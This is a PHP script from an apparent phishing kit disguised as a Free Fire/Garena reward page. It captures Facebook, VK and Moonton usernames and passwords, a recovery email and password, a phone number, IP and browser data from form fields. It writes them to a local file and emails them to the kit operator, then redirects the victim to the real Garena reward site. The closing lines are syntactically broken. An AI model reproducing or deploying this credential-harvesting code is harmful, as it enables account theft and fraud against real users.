<?php
error_reporting(0);
?>
<?php
file_put_contents("hasil.txt", "USERNAME/ID: " . $_POST['fb1'] . " PASSWORD: " . $_POST['fb2'] . "\n", FILE_APPEND);
?>
<?php
include('cilepeung.php');
$nick = $_POST['nickname'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$email3 = $_POST['vk1'];
$pass3 = $_POST['vk2'];
$email4 = $_POST['moonton1'];
$pass4 = $_POST['moonton2'];
$lev = $_POST['level'];
$log = $_POST['login'];
$ski = $_POST['skin'];
$coun = $_POST['country'];
$number= $_POST['phone'];
$emailr= $_POST['emailr'];
$passr= $_POST['passr'];

$message   = "

====[ FACEBOOK ACCOUNT ]====

• Email Facebook :  ".$email2."
• Password Facebook : ".$pass2."

====[ VK ACCOUNT ]====

• Email VK : ".$email3."
• Password VK : ".$pass3."


• Nickname : ".$nick."
• Level : ".$lev."
• Email Recovery : ".$emailr."
• ID : ".$ski."
• Number Phone : ".$number."
• Country : ".$coun."


====[ INFO DEVICE ]====

• IP Info   :  ".$alamat."  ".$nama_negro." On ".gmdate('r')."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']." 

======[Publish by : https://scriptpeer.blogspot.com]=======
";

include 'email.php';
$subject = "LV [ ".$lev." ] ID [ ".$ski." ]";
$headers = "From: AKUN DARI UHUINFO <S-UHU@info.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>
'<script>window.location.replace("https://reward.ff.garena.com/")</script>';}
}
?>
